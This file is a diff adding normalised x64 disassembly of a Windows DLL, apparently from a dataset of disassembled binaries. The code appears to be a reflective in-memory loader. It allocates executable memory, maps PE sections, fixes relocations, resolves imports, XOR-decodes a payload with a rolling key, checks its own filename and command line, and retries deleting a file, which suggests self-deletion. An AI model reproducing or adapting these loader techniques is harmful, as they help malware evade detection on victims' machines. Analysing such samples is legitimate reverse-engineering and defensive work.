@@ -1,0 +1,1399 @@
+sub_180001000
+mov [ rsp + 0x8 ] rcx
+sub rsp 0x38
+lea r8 [ sub_1800012b0 ]
+test r8 r8
+jne r-xdata
+xor ecx ecx
+lea rax [ rsp + 0x40 ]
+xor r9d r9d
+mov [ rsp + 0x28 ] rax
+xor edx edx
+mov [ rsp + 0x20 ] ecx
+mov [ rsp + 0x40 ] ecx
+call [ CreateThread@IAT ]
+test rax rax
+je r-xdata
+xor eax eax
+add rsp 0x38
+retn
+mov eax [ rsp + 0x40 ]
+add rsp 0x38
+retn
+mov rcx rax
+call [ CloseHandle@IAT ]
+sub_180001060
+sub rsp 0x2b8
+mov rax [ rw-data ]
+xor rax rsp
+mov [ rsp + 0x2a0 ] rax
+lea rcx [ rsp + 0x21 ]
+xor edx edx
+mov r8d 0x13f
+mov [ rsp + 0x20 ] 0x0
+call sub_180002480
+lea rdx [ rsp + 0x20 ]
+mov r8d 0x140
+xor ecx ecx
+call [ GetModuleFileNameA@IAT ]
+lea rcx [ rsp + 0x20 ]
+call sub_1800015b0
+lea rdx [ r--data ]
+lea rcx [ rsp + 0x20 ]
+call sub_180001d60
+test rax rax
+je r-xdata
+xor eax eax
+mov rcx [ rsp + 0x2a0 ]
+xor rcx rsp
+call sub_180001d40
+add rsp 0x2b8
+retn
+lea rcx [ rsp + 0x161 ]
+xor edx edx
+mov r8d 0x13f
+mov [ rsp + 0x160 ] 0x0
+call sub_180002480
+call [ GetCommandLineA@IAT ]
+test rax rax
+je r-xdata
+lea rcx [ rsp + 0x160 ]
+mov r8d 0x140
+mov rdx rax
+call sub_180001dd0
+lea rcx [ rsp + 0x160 ]
+call sub_1800015b0
+lea rdx [ r--data ]
+lea rcx [ rsp + 0x160 ]
+call sub_180001d60
+test rax rax
+je r-xdata
+mov eax 0x1
+mov rcx [ rsp + 0x2a0 ]
+xor rcx rsp
+call sub_180001d40
+add rsp 0x2b8
+retn
+sub_180001170
+mov r11 rsp
+push rbp
+sub rsp 0x430
+mov rax [ rw-data ]
+xor rax rsp
+mov [ rsp + 0x420 ] rax
+mov [ r11 + 0x8 ] rbx
+lea rcx [ rw-data ]
+mov edx 0x1
+mov [ r11 + 0x18 ] rdi
+call sub_180001ae0
+test rax rax
+je r-xdata
+lea rcx [ rsp + 0x21 ]
+xor edx edx
+mov r8d 0x3ff
+mov [ rsp + 0x20 ] 0x0
+call sub_180002480
+mov edx [ rw-data ]
+add edx 0xfffffffc
+xor ebx ebx
+mov dil 0x99
+add rdx [ rw-data ]
+mov ebp ebx
+movsxd rcx [ rdx ]
+lea eax [ rcx - 0x1 ]
+cmp eax 0x7fe
+ja r-xdata
+lea rdx [ r--data ]
+mov rcx rax
+call sub_180001c50
+test rax rax
+je r-xdata
+lea rcx [ rw-data ]
+mov edx 0x1
+call sub_180001ae0
+mov rdi [ rsp + 0x450 ]
+mov rbx [ rsp + 0x440 ]
+test rax rax
+je r-xdata
+mov ebp ecx
+sub rdx rcx
+mov r8 rcx
+mov [ rsp + 0x448 ] rsi
+mov rsi rcx
+lea rcx [ rsp + 0x20 ]
+call sub_1800020b0
+test rsi rsi
+jle r-xdata
+mov edx [ rw-data ]
+mov rcx [ rw-data ]
+call rax
+mov eax 0x1
+mov rcx [ rsp + 0x420 ]
+xor rcx rsp
+call sub_180001d40
+add rsp 0x430
+pop rbp
+retn
+lea rdx [ r--data ]
+mov rcx rax
+call sub_180001c50
+test rax rax
+je r-xdata
+mov rsi [ rsp + 0x448 ]
+nop [ rax + rax ] eax
+lea rcx [ rsp + 0x20 ]
+mov edx ebp
+call rax
+xor [ rsp + rbx + 0x20 ] dil
+inc rbx
+inc dil
+cmp rbx rsi
+jl r-xdata
+sub_1800012b0
+sub rsp 0x28
+cmp [ rw-data ] 0x0
+je r-xdata
+call sub_180001170
+xor eax eax
+add rsp 0x28
+retn
+lea rcx [ rw-data ]
+mov edx 0x80
+mov [ rsp + 0x20 ] rbx
+call [ SetFileAttributesA@IAT ]
+mov ebx 0x5
+nop [ rax ] eax
+mov rbx [ rsp + 0x20 ]
+test ebx ebx
+jne r-xdata
+mov ecx 0x3e8
+dec ebx
+call [ Sleep@IAT ]
+lea rcx [ rw-data ]
+call [ DeleteFileA@IAT ]
+test eax eax
+jne r-xdata
+DllMain_mem
+mov [ rsp + 0x8 ] rbx
+push rdi
+sub rsp 0x20
+mov rbx rdx
+mov rdx rcx
+mov edi r8d
+lea rcx [ rw-data ]
+mov r8d 0x140
+call sub_180001dd0
+lea rcx [ sub_1800012b0 ]
+xor edx edx
+mov [ rw-data ] rbx
+mov [ rw-data ] edi
+call sub_180001000
+mov rbx [ rsp + 0x30 ]
+mov eax 0x1
+add rsp 0x20
+pop rdi
+retn
+sub_180001370
+mov [ rsp + 0x8 ] rcx
+sub rsp 0x48
+cmp [ rw-data ] 0x0
+je r-xdata
+xor eax eax
+add rsp 0x48
+retn
+mov [ rsp + 0x58 ] rbx
+xor ebx ebx
+lea rcx [ rw-data ]
+mov [ rsp + 0x30 ] rbx
+lea r8d [ rbx + 0x3 ]
+xor r9d r9d
+mov edx 0x80000000
+mov [ rsp + 0x28 ] 0x80
+mov [ rsp + 0x40 ] rdi
+mov [ rsp + 0x20 ] 0x3
+call [ CreateFileA@IAT ]
+mov rdi rax
+cmp rax 0xffffffffffffffff
+jne r-xdata
+xor edx edx
+mov rcx rax
+mov [ rsp + 0x60 ] rsi
+call [ GetFileSize@IAT ]
+mov rcx [ rw-data ]
+mov [ rw-data ] ebx
+mov esi eax
+call sub_1800016b0
+mov ecx esi
+call sub_180001630
+mov [ rw-data ] rax
+test rax rax
+je r-xdata
+mov rbx [ rsp + 0x58 ]
+mov rdi [ rsp + 0x40 ]
+xor eax eax
+add rsp 0x48
+retn
+mov rcx rdi
+call [ CloseHandle@IAT ]
+mov rsi [ rsp + 0x60 ]
+mov rdi [ rsp + 0x40 ]
+mov eax ebx
+mov rbx [ rsp + 0x58 ]
+add rsp 0x48
+retn
+lea r9 [ rsp + 0x50 ]
+mov r8d esi
+mov rdx rax
+mov rcx rdi
+mov [ rsp + 0x50 ] ebx
+mov [ rsp + 0x20 ] rbx
+call [ ReadFile@IAT ]
+mov ecx [ rw-data ]
+test eax eax
+mov ebx eax
+cmovne ecx esi
+mov [ rw-data ] ecx
+sub_180001470
+mov [ rsp + 0x8 ] rbx
+push rdi
+sub rsp 0x20
+mov rbx rdx
+test rdx rdx
+je r-xdata
+lea rdx [ rw-data ]
+mov r8d 0x140
+call [ GetModuleFileNameA@IAT ]
+lea rcx [ rw-data ]
+call sub_180001370
+mov r11d [ rw-data ]
+mov rdi [ rw-data ]
+mov rcx [ rw-data ]
+mov [ rw-data ] 0x0
+call sub_1800016b0
+mov ecx [ rbx + 0x8 ]
+call sub_180001630
+mov rdi rax
+mov [ rw-data ] rax
+test rax rax
+je r-xdata
+xor eax eax
+mov rbx [ rsp + 0x30 ]
+add rsp 0x20
+pop rdi
+retn
+test r11d r11d
+je r-xdata
+movsxd r8 [ rbx + 0x8 ]
+mov rdx [ rbx ]
+mov rcx rax
+call sub_1800020b0
+mov r11d [ rbx + 0x8 ]
+mov [ rw-data ] r11d
+jmp r-xdata
+mov eax 0x1
+mov rbx [ rsp + 0x30 ]
+add rsp 0x20
+pop rdi
+retn
+test rdi rdi
+je r-xdata
+_start
+mov [ rsp + 0x8 ] rbx
+push rdi
+sub rsp 0x20
+mov rbx r8
+mov rdi rcx
+cmp edx 0x1
+jne r-xdata
+xor eax eax
+mov rbx [ rsp + 0x30 ]
+add rsp 0x20
+pop rdi
+retn
+call sub_180001060
+test eax eax
+je r-xdata
+cmp [ rw-data ] 0x0
+jne r-xdata
+mov rdx rbx
+mov rcx rdi
+mov [ rw-data ] 0x1
+call sub_180001470
+test eax eax
+je r-xdata
+mov rcx [ rw-data ]
+xor edx edx
+call sub_180001ae0
+lea rdx [ r--data ]
+mov rcx rax
+call sub_180001c50
+test rax rax
+je r-xdata
+mov r8d [ rw-data ]
+mov rdx [ rw-data ]
+lea rcx [ rw-data ]
+call rax
+sub_1800015b0
+test rcx rcx
+je r-xdata
+retn
+cmp [ rcx ] 0x0
+je r-xdata
+nop [ rax + rax ] ax
+inc rcx
+cmp [ rcx ] 0x0
+jne r-xdata
+cmp al 0x5a
+jg r-xdata
+movzx eax [ rcx ]
+cmp al 0x41
+jl r-xdata
+add al 0x20
+mov [ rcx ] al
+sub_1800015e0
+xor al al
+mov r9 rdx
+test r8 r8
+je r-xdata
+retn
+sub r9 rcx
+nop [ rax ] eax
+add al [ rcx ]
+movzx edx [ r9 + rcx ]
+inc rcx
+sub r8 0x1
+mov [ rcx - 0x1 ] dl
+jne r-xdata
+sub_180001630
+sub rsp 0x28
+test ecx ecx
+jne r-xdata
+mov [ rsp + 0x30 ] rbx
+mov [ rsp + 0x20 ] rdi
+mov edi ecx
+lea rdx [ rdi + 0x8 ]
+mov ecx 0x40
+call [ LocalAlloc@IAT ]
+mov rbx rax
+test rax rax
+jne r-xdata
+xor eax eax
+add rsp 0x28
+retn
+mov rcx rax
+call [ LocalLock@IAT ]
+mov r8 rdi
+xor edx edx
+lea rcx [ rax + 0x8 ]
+mov r11 rax
+mov [ rax ] rbx
+call sub_180001610
+mov rbx [ rsp + 0x30 ]
+mov rdi [ rsp + 0x20 ]
+lea rax [ r11 + 0x8 ]
+add rsp 0x28
+retn
+mov rbx [ rsp + 0x30 ]
+mov rdi [ rsp + 0x20 ]
+add rsp 0x28
+retn
+sub_1800016b0
+push rbx
+sub rsp 0x20
+mov rbx [ rw-data ]
+test rbx rbx
+je r-xdata
+add rsp 0x20
+pop rbx
+retn
+mov rbx [ rbx - 0x8 ]
+mov rcx rbx
+call [ LocalUnlock@IAT ]
+mov rcx rbx
+call [ LocalFree@IAT ]
+sub_1800016e0
+mov [ rsp + 0x18 ] rbp
+mov [ rsp + 0x20 ] rsi
+push r12
+push r13
+push r14
+sub rsp 0x20
+mov rax [ r8 ]
+mov r13 [ r8 + 0x8 ]
+xor esi esi
+mov r12 rdx
+movzx edx [ rax + 0x14 ]
+mov rbp r8
+mov r14 rcx
+cmp si [ rax + 0x6 ]
+jae r-xdata
+mov rbp [ rsp + 0x50 ]
+mov rsi [ rsp + 0x58 ]
+add rsp 0x20
+pop r14
+pop r13
+pop r12
+retn
+mov [ rsp + 0x48 ] rdi
+lea rdi [ rdx + rax + 0x28 ]
+mov [ rsp + 0x40 ] rbx
+mov ecx [ rdi - 0x4 ]
+mov rdx rax
+mov r9d 0x40
+add rcx r13
+mov r8d 0x1000
+call [ VirtualAlloc@IAT ]
+mov edx [ rdi + 0x4 ]
+mov r8d [ rdi ]
+add rdx r14
+mov rcx rax
+mov r11 rax
+call sub_1800015e0
+mov [ rdi - 0x8 ] r11d
+movsxd rax [ r12 + 0x38 ]
+test eax eax
+jle r-xdata
+mov eax [ rdi ]
+test eax eax
+jne r-xdata
+mov rdi [ rsp + 0x48 ]
+mov rbx [ rsp + 0x40 ]
+mov rax [ rbp ]
+inc esi
+add rdi 0x28
+movzx ecx [ rax + 0x6 ]
+cmp esi ecx
+jl r-xdata
+mov ecx [ rdi - 0x4 ]
+mov r9d 0x40
+mov r8d 0x1000
+mov rdx rax
+add rcx r13
+mov rbx rax
+call [ VirtualAlloc@IAT ]
+mov r8 rbx
+xor edx edx
+mov rcx rax
+mov [ rdi - 0x8 ] eax
+call sub_180001610
+jmp r-xdata
+sub_1800017d0
+push rbp
+push rsi
+push rdi
+sub rsp 0x20
+mov r8 [ rcx ]
+mov rbp rcx
+mov rcx 0xffffffff00000000
+mov rsi [ r8 + 0x30 ]
+movzx eax [ r8 + 0x14 ]
+xor edi edi
+and rsi rcx
+cmp di [ r8 + 0x6 ]
+jae r-xdata
+add rsp 0x20
+pop rdi
+pop rsi
+pop rbp
+retn
+mov [ rsp + 0x48 ] rbx
+mov [ rsp + 0x50 ] r12
+lea r12 [ rw-data ]
+lea rbx [ rax + r8 + 0x3c ]
+nop [ rax + rax ] ax
+bt r9d 0x1a
+movsxd rcx eax
+movsxd rax edx
+lea rdx [ rax + rcx * 2 ]
+lea rcx [ r10 + rdx * 2 ]
+mov r10d [ r12 + rcx * 4 ]
+jae r-xdata
+mov ecx [ rbx - 0x1c ]
+mov edx [ rbx - 0x14 ]
+mov r8d 0x4000
+or rcx rsi
+call [ VirtualFree@IAT ]
+jmp r-xdata
+mov eax [ rbx - 0x14 ]
+test eax eax
+jne r-xdata
+bts r10d 0x9
+mov r8 [ rbp ]
+inc edi
+add rbx 0x28
+movzx eax [ r8 + 0x6 ]
+cmp edi eax
+jl r-xdata
+test eax eax
+je r-xdata
+test r9b 0x40
+je r-xdata
+mov r9d [ rbx ]
+mov eax r9d
+mov edx r9d
+mov r10d r9d
+shr eax 0x1d
+shr edx 0x1e
+shr r10d 0x1f
+and eax 0x1
+and edx 0x1
+bt r9d 0x19
+jae r-xdata
+mov r12 [ rsp + 0x50 ]
+mov rbx [ rsp + 0x48 ]
+mov ecx [ rbx - 0x1c ]
+lea r9 [ rsp + 0x40 ]
+mov edx eax
+or rcx rsi
+mov r8d r10d
+call [ VirtualProtect@IAT ]
+test r9b r9b
+jns r-xdata
+mov eax [ r8 + 0x20 ]
+jmp r-xdata
+mov eax [ r8 + 0x24 ]
+sub_1800018e0
+mov [ rsp + 0x8 ] rbx
+mov rax [ rcx ]
+mov rbx [ rcx + 0x8 ]
+mov r11 rdx
+cmp [ rax + 0xb4 ] 0x0
+jbe r-xdata
+mov rbx [ rsp + 0x8 ]
+retn
+mov r8d [ rax + 0xb0 ]
+add r8 rbx
+mov eax [ r8 ]
+test eax eax
+je r-xdata
+nop [ rax ] eax
+mov eax [ r8 + 0x4 ]
+add r8 rax
+mov eax [ r8 ]
+test eax eax
+jne r-xdata
+nop [ rax ] eax
+mov r10d eax
+mov eax [ r8 + 0x4 ]
+xor edx edx
+sub rax 0x8
+add r10 rbx
+lea r9 [ r8 + 0x8 ]
+test rax 0xfffffffffffffffe
+jbe r-xdata
+movsxd rax ecx
+add [ rax + r10 ] r11d
+cmp eax 0xa
+jne r-xdata
+movzx eax [ r9 ]
+mov ecx eax
+shr eax 0xc
+and ecx 0xfff
+cmp eax 0x3
+je r-xdata
+mov ecx [ r8 + 0x4 ]
+inc edx
+add r9 0x2
+sub rcx 0x8
+mov eax edx
+shr rcx 0x1
+cmp rax rcx
+jb r-xdata
+movsxd rax ecx
+add [ rax + r10 ] r11
+jmp r-xdata
+sub_180001990
+push rbp
+sub rsp 0x30
+mov rax [ rcx ]
+mov rbp [ rcx + 0x8 ]
+cmp [ rax + 0x94 ] 0x0
+jbe r-xdata
+mov eax 0x1
+add rsp 0x30
+pop rbp
+retn
+mov [ rsp + 0x48 ] rsi
+mov esi [ rax + 0x90 ]
+mov edx 0x14
+add rsi rbp
+mov rcx rsi
+call [ IsBadReadPtr@IAT ]
+test eax eax
+jne r-xdata
+mov eax 0x1
+mov rsi [ rsp + 0x48 ]
+add rsp 0x30
+pop rbp
+retn
+mov [ rsp + 0x40 ] rbx
+mov [ rsp + 0x50 ] rdi
+mov [ rsp + 0x28 ] r12
+mov [ rsp + 0x20 ] r13
+mov r13 0x8000000000000000
+nop [ rax ] eax
+mov eax 0x1
+lea rcx [ rbp + rax ]
+call [ LoadLibraryA@IAT ]
+mov r12 rax
+test rax rax
+je r-xdata
+mov ecx [ rsi + 0xc ]
+add rcx rbp
+call [ OutputDebugStringA@IAT ]
+mov ecx [ rsi ]
+test ecx ecx
+je r-xdata
+mov r12 [ rsp + 0x28 ]
+mov rdi [ rsp + 0x50 ]
+mov rbx [ rsp + 0x40 ]
+mov r13 [ rsp + 0x20 ]
+mov rsi [ rsp + 0x48 ]
+add rsp 0x30
+pop rbp
+retn
+mov edi [ rsi + 0x10 ]
+add rdi rbp
+mov rbx rdi
+mov ebx [ rsi + 0x10 ]
+lea rdi [ rbp + rcx ]
+add rbx rbp
+jmp r-xdata
+add rsi 0x14
+mov edx 0x14
+mov rcx rsi
+call [ IsBadReadPtr@IAT ]
+test eax eax
+je r-xdata
+test r13 rax
+je r-xdata
+mov rax [ rdi ]
+test rax rax
+je r-xdata
+mov eax [ rsi + 0xc ]
+test eax eax
+je r-xdata
+lea rdx [ rax + rbp + 0x2 ]
+mov rcx r12
+call [ GetProcAddress@IAT ]
+mov [ rbx ] rax
+movzx edx ax
+mov rcx r12
+call [ GetProcAddress@IAT ]
+mov [ rbx ] rax
+jmp r-xdata
+xor eax eax
+jmp r-xdata
+mov rax [ rdi + 0x8 ]
+add rdi 0x8
+add rbx 0x8
+test rax rax
+jne r-xdata
+cmp [ rbx ] 0x0
+je r-xdata
+sub_180001ae0
+mov [ rsp + 0x10 ] rbp
+mov [ rsp + 0x18 ] rsi
+mov [ rsp + 0x20 ] rdi
+push r12
+sub rsp 0x20
+movsxd rsi [ rcx + 0x3c ]
+mov r12d edx
+mov rbp rcx
+add rsi rcx
+mov r9d 0x40
+mov r8d 0x2000
+mov edx [ rsi + 0x50 ]
+mov rcx [ rsi + 0x30 ]
+call [ VirtualAlloc@IAT ]
+mov rdi rax
+test rax rax
+jne r-xdata
+mov ecx 0x20
+mov [ rsp + 0x30 ] rbx
+call sub_180001630
+mov rbx rax
+test rax rax
+je r-xdata
+mov edx [ rsi + 0x50 ]
+lea r9d [ rax + 0x40 ]
+xor ecx ecx
+mov r8d 0x2000
+call [ VirtualAlloc@IAT ]
+mov rdi rax
+test rax rax
+je r-xdata
+xor eax eax
+mov [ rax + 0x8 ] rdi
+xor eax eax
+mov r8d 0x1000
+mov [ rbx + 0x18 ] eax
+mov [ rbx + 0x10 ] rax
+mov [ rbx + 0x1c ] eax
+mov edx [ rsi + 0x50 ]
+lea r9d [ rax + 0x40 ]
+mov rcx rdi
+call [ VirtualAlloc@IAT ]
+mov edx [ rsi + 0x54 ]
+mov r9d 0x40
+mov r8d 0x1000
+mov rcx rdi
+call [ VirtualAlloc@IAT ]
+mov r8d [ rsi + 0x54 ]
+mov rdx rbp
+add r8d [ rbp + 0x3c ]
+mov rcx rax
+mov r11 rax
+call sub_1800015e0
+movsxd rax [ rbp + 0x3c ]
+mov r8 rbx
+add rax r11
+mov rdx rsi
+mov rcx rbp
+mov [ rbx ] rax
+mov [ rax + 0x30 ] rdi
+call sub_1800016e0
+mov rdx rdi
+sub rdx [ rsi + 0x30 ]
+je r-xdata
+mov rbp [ rsp + 0x38 ]
+mov rsi [ rsp + 0x40 ]
+mov rdi [ rsp + 0x48 ]
+add rsp 0x20
+pop r12
+retn
+mov rcx rbx
+call sub_180001990
+test eax eax
+je r-xdata
+mov rcx rbx
+call sub_1800018e0
+mov rcx rbx
+call sub_1800017d0
+test r12d r12d
+je r-xdata
+mov rax rbx
+jmp r-xdata
+mov rax [ rbx ]
+mov ecx [ rax + 0x28 ]
+test ecx ecx
+je r-xdata
+mov rbx [ rsp + 0x30 ]
+mov rax rcx
+add rax rdi
+je r-xdata
+xor r8d r8d
+mov rcx rdi
+lea edx [ r8 + 0x1 ]
+call rax
+test eax eax
+je r-xdata
+mov [ rbx + 0x1c ] 0x1
+sub_180001c50
+mov [ rsp + 0x18 ] rsi
+push r12
+mov rax [ rcx ]
+mov rsi [ rcx + 0x8 ]
+mov r12 rdx
+cmp [ rax + 0x8c ] 0x0
+jne r-xdata
+mov [ rsp + 0x10 ] rbx
+mov ebx [ rax + 0x88 ]
+mov [ rsp + 0x18 ] rdi
+add rbx rsi
+mov edi [ rbx + 0x18 ]
+test edi edi
+je r-xdata
+xor eax eax
+mov rsi [ rsp + 0x20 ]
+pop r12
+retn
+mov rbx [ rsp + 0x10 ]
+mov rdi [ rsp + 0x18 ]
+xor eax eax
+mov rsi [ rsp + 0x20 ]
+pop r12
+retn
+cmp [ rbx + 0x14 ] 0x0
+je r-xdata
+mov r10d [ rbx + 0x20 ]
+mov r11d [ rbx + 0x24 ]
+xor r9d r9d
+add r10 rsi
+add r11 rsi
+test edi edi
+je r-xdata
+nop [ rax ] eax
+test edx edx
+je r-xdata
+inc rax
+test ecx ecx
+jne r-xdata
+movzx ecx [ r11 ]
+cmp ecx 0xffffffff
+je r-xdata
+inc r9d
+add r10 0x4
+add r11 0x2
+cmp r9d edi
+jb r-xdata
+movzx edx [ rax ]
+movzx ecx [ rax + r8 ]
+sub edx ecx
+jne r-xdata
+cmp ecx [ rbx + 0x14 ]
+ja r-xdata
+mov r8d [ r10 ]
+mov rax r12
+add r8 rsi
+sub r8 r12
+nop [ rax ] eax
+mov eax [ rbx + 0x1c ]
+mov rdi [ rsp + 0x18 ]
+mov rbx [ rsp + 0x10 ]
+add rax rsi
+mov eax [ rax + rcx * 4 ]
+add rax rsi
+mov rsi [ rsp + 0x20 ]
+pop r12
+retn
+sub_180001d60
+xor r11d r11d
+mov r10 rdx
+mov r8 rcx
+cmp [ rdx ] r11b
+jne r-xdata
+mov al [ rcx ]
+cmp al r11b
+je r-xdata
+mov rax rcx
+retn
+xor eax eax
+retn
+mov r9 rcx
+sub r9 rdx
+cmp [ rdx ] r11b
+je r-xdata
+cmp [ rdx ] r11b
+je r-xdata
+mov rax r8
+retn
+inc r8
+inc r9
+mov al [ r8 ]
+cmp al r11b
+jne r-xdata
+movsx ecx [ r9 + rdx ]
+movsx eax [ rdx ]
+cmp ecx eax
+jne r-xdata
+mov rdx r10
+cmp al r11b
+je r-xdata
+inc rdx
+cmp [ r9 + rdx ] r11b
+jne r-xdata
+sub_180001dd0
+mov r11 rcx
+or r8 r8
+je r-xdata
+mov rax r11
+retn
+sub rcx rdx
+test dl 0x7
+je r-xdata
+mov rax [ rdx ]
+sub r8 0x8
+jb r-xdata
+mov al [ rdx ]
+test al al
+mov [ rcx + rdx ] al
+je r-xdata
+add r8 0x8
+je r-xdata
+mov r9 0x7efefefefefefeff
+add r9 rax
+mov r10 rax
+xor r10 0xffffffffffffffff
+xor r10 r9
+mov r9 0x8101010101010100
+test r9 r10
+je r-xdata
+add rcx rdx
+xor rdx rdx
+cmp r8 0x10
+jb r-xdata
+inc rdx
+dec r8
+je r-xdata
+mov rax r11
+retn
+test al al
+mov [ rcx + rdx ] al
+je r-xdata
+mov [ rcx + rdx ] rax
+add rdx 0x8
+sub r8 0x1
+jb r-xdata
+test cl 0x7
+je r-xdata
+test dl 0x7
+jne r-xdata
+inc rdx
+dec r8
+je r-xdata
+mov rax r11
+retn
+mov [ rcx ] dl
+inc rcx
+jmp r-xdata
+sub r8 0x20
+jb r-xdata
+inc rcx
+mov [ rcx ] dl
+dec r8
+jmp r-xdata
+jmp r-xdata
+test ah ah
+mov [ rcx + rdx ] ah
+je r-xdata
+add r8 0x20
+mov [ rcx ] rdx
+mov [ rcx + 0x8 ] rdx
+mov [ rcx + 0x10 ] rdx
+mov [ rcx + 0x18 ] rdx
+add rcx 0x20
+sub r8 0x20
+jae r-xdata
+inc rdx
+dec r8
+je r-xdata
+add r8 0x8
+mov [ rcx ] rdx
+add rcx 0x8
+jmp r-xdata
+shr rax 0x10
+test al al
+mov [ rcx + rdx ] al
+je r-xdata
+sub r8 0x8
+jb r-xdata
+inc rdx
+dec r8
+je r-xdata
+test ah ah
+mov [ rcx + rdx ] ah
+je r-xdata
+inc rdx
+dec r8
+je r-xdata
+shr rax 0x10
+test al al
+mov [ rcx + rdx ] al
+je r-xdata
+inc rdx
+dec r8
+je r-xdata
+test ah ah
+mov [ rcx + rdx ] ah
+je r-xdata
+inc rdx
+dec r8
+je r-xdata
+shr eax 0x10
+test al al
+mov [ rcx + rdx ] al
+je r-xdata
+inc rdx
+dec r8
+je r-xdata
+test ah ah
+mov [ rcx + rdx ] ah
+je r-xdata
+inc rdx
+dec r8
+jne r-xdata
+sub_180001f34
+mov [ rsp + 0x8 ] rcx
+sub rsp 0x88
+lea rcx [ rw-data ]
+call [ RtlCaptureContext@IAT ]
+mov r11 [ rw-data ]
+mov [ rsp + 0x58 ] r11
+xor r8d r8d
+lea rdx [ rsp + 0x60 ]
+mov rcx [ rsp + 0x58 ]
+call RtlLookupFunctionEntry
+mov [ rsp + 0x50 ] rax
+cmp [ rsp + 0x50 ] 0x0
+je r-xdata
+mov rax [ rsp + 0x88 ]
+mov [ rw-data ] rax
+lea rax [ rsp + 0x88 ]
+add rax 0x8
+mov [ rw-data ] rax
+mov [ rsp + 0x38 ] 0x0
+lea rax [ rsp + 0x48 ]
+mov [ rsp + 0x30 ] rax
+lea rax [ rsp + 0x40 ]
+mov [ rsp + 0x28 ] rax
+lea rax [ rw-data ]
+mov [ rsp + 0x20 ] rax
+mov r9 [ rsp + 0x50 ]
+mov r8 [ rsp + 0x58 ]
+mov rdx [ rsp + 0x60 ]
+xor ecx ecx
+call RtlVirtualUnwind
+jmp r-xdata
+call [ GetCurrentProcess@IAT ]
+mov edx 0xc0000409
+mov rcx rax
+call [ TerminateProcess@IAT ]
+add rsp 0x88
+retn
+mov ecx 0x1
+call sub_180002080
+mov rax [ rw-data ]
+mov [ rw-data ] rax
+mov rax [ rsp + 0x90 ]
+mov [ rw-data ] rax
+mov [ rw-data ] 0xc0000409
+mov [ rw-data ] 0x1
+mov rax [ rw-data ]
+mov [ rsp + 0x68 ] rax
+mov rax [ rw-data ]
+mov [ rsp + 0x70 ] rax
+call [ IsDebuggerPresent@IAT ]
+mov [ rw-data ] eax
+mov ecx 0x1
+call sub_180002080
+xor ecx ecx
+call [ SetUnhandledExceptionFilter@IAT ]
+lea rcx [ r--data ]
+call [ UnhandledExceptionFilter@IAT ]
+cmp [ rw-data ] 0x0
+jne r-xdata
+sub_1800020b0
+mov r11 rcx
+sub rdx rcx
+jb r-xdata
+add rcx r8
+cmp r8 0x8
+jb r-xdata
+cmp r8 0x8
+jb r-xdata
+test r8 r8
+jne r-xdata
+test cl 0x7
+je r-xdata
+test r8 r8
+jne r-xdata
+test cl 0x7
+je r-xdata
+dec rcx
+mov al [ rdx + rcx ]
+dec r8
+mov [ rcx ] al
+jne r-xdata
+mov rax r11
+retn
+mov r9 r8
+shr r9 0x5
+jne r-xdata
+test cl 0x1
+je r-xdata
+mov al [ rdx + rcx ]
+mov [ rcx ] al
+inc rcx
+dec r8
+jne r-xdata
+mov rax r11
+retn
+mov r9 r8
+shr r9 0x5
+jne r-xdata
+test cl 0x1
+je r-xdata
+mov rax r11
+retn
+cmp r9 0x2000
+jae r-xdata
+mov r9 r8
+shr r9 0x3
+je r-xdata
+test cl 0x2
+je r-xdata
+dec rcx
+mov al [ rdx + rcx ]
+dec r8
+mov [ rcx ] al
+mov rax r11
+retn
+cmp r9 0x2000
+jae r-xdata
+mov r9 r8
+shr r9 0x3
+je r-xdata
+test cl 0x2
+je r-xdata
+mov al [ rdx + rcx ]
+dec r8
+mov [ rcx ] al
+inc rcx
+cmp rdx 0xfffffffffffff000
+ja r-xdata
+mov rax [ rdx + rcx - 0x8 ]
+mov r10 [ rdx + rcx - 0x10 ]
+sub rcx 0x20
+mov [ rcx + 0x18 ] rax
+mov [ rcx + 0x10 ] r10
+mov rax [ rdx + rcx + 0x8 ]
+mov r10 [ rdx + rcx ]
+dec r9
+mov [ rcx + 0x8 ] rax
+mov [ rcx ] r10
+jne r-xdata
+sub rcx 0x8
+mov rax [ rdx + rcx ]
+dec r9
+mov [ rcx ] rax
+jne r-xdata
+test cl 0x4
+je r-xdata
+sub rcx 0x2
+mov ax [ rdx + rcx ]
+sub r8 0x2
+mov [ rcx ] ax
+cmp rdx 0x1000
+jb r-xdata
+mov rax [ rdx + rcx ]
+mov r10 [ rdx + rcx + 0x8 ]
+add rcx 0x20
+mov [ rcx - 0x20 ] rax
+mov [ rcx - 0x18 ] r10
+mov rax [ rdx + rcx - 0x10 ]
+mov r10 [ rdx + rcx - 0x8 ]
+dec r9
+mov [ rcx - 0x10 ] rax
+mov [ rcx - 0x8 ] r10
+jne r-xdata
+mov rax [ rdx + rcx ]
+mov [ rcx ] rax
+add rcx 0x8
+dec r9
+jne r-xdata
+test cl 0x4
+je r-xdata
+mov ax [ rdx + rcx ]
+sub r8 0x2
+mov [ rcx ] ax
+add rcx 0x2
+mov eax 0x20
+and r8 0x1f
+jmp r-xdata
+and r8 0x7
+sub rcx 0x4
+mov eax [ rdx + rcx ]
+sub r8 0x4
+mov [ rcx ] eax
+mov eax 0x20
+and r8 0x1f
+jmp r-xdata
+and r8 0x7
+mov eax [ rdx + rcx ]
+sub r8 0x4
+mov [ rcx ] eax
+add rcx 0x4
+sub rcx 0x80
+prefetchnta [ rdx + rcx ]
+prefetchnta [ rdx + rcx + 0x40 ]
+dec eax
+jne r-xdata
+add rcx 0x1000
+mov eax 0x40
+prefetchnta [ rdx + rcx ]
+prefetchnta [ rdx + rcx + 0x40 ]
+add rcx 0x80
+dec eax
+jne r-xdata
+sub rcx 0x1000
+mov eax 0x40
+mov r9 [ rdx + rcx - 0x8 ]
+mov r10 [ rdx + rcx - 0x10 ]
+movnti [ rcx - 0x8 ] r9
+movnti [ rcx - 0x10 ] r10
+mov r9 [ rdx + rcx - 0x18 ]
+mov r10 [ rdx + rcx - 0x20 ]
+movnti [ rcx - 0x18 ] r9
+movnti [ rcx - 0x20 ] r10
+mov r9 [ rdx + rcx - 0x28 ]
+mov r10 [ rdx + rcx - 0x30 ]
+sub rcx 0x40
+movnti [ rcx + 0x18 ] r9
+movnti [ rcx + 0x10 ] r10
+mov r9 [ rdx + rcx + 0x8 ]
+mov r10 [ rdx + rcx ]
+dec eax
+movnti [ rcx + 0x8 ] r9
+movnti [ rcx ] r10
+jne r-xdata
+sub r8 0x1000
+cmp r8 0x1000
+jae r-xdata
+mov r9 [ rdx + rcx ]
+mov r10 [ rdx + rcx + 0x8 ]
+movnti [ rcx ] r9
+movnti [ rcx + 0x8 ] r10
